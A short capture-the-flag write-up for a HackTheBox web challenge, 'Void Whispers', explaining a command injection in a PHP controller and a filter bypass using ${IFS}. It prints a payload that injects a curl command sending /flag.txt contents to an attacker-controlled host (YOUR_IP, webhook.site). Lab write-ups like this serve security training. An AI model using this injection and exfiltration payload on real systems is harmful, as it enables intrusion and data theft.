---
title: Void Whispers
tags:
  - CTF
  - HackTheBox
  - Web
---
Once we downloaded the files, we inspect the `Dockerfile`. As we can see, the flag is stored in `/flag.txt`:

![](Pasted%20image%2020241023153233.png)

So I decided to take a look at `IndexController.php`:

![](Pasted%20image%2020241023153332.png)

First of all, we can't use spaces, and then the `$sendMailPath` is vulnerable to Command Injection. In this case, we can use a special environment of Unix systems which is `${IFS}`, that stands for "Internal Field Separator". It is used by the shell to separate words in a command (like the space, the tab or a newline).

- I've created a note related to this, because it seems interesting to me to have this stored here since now: [Unix Environment Variables 🌋](/notes/Linux%20things/special_unix_environment_variables.md)

Payload: `/usr/sbin/sendmail;curl${IFS}<https://YOUR_IP>/?x=$(cat${IFS}/flag.txt)`

So here I'll be using [Webhook.site](https://webhook.site/) to have a temporally web server and send there the curl output:

![](Pasted%20image%2020241023153848.png)
Now I checked the webserver:

![](Pasted%20image%2020241023153919.png)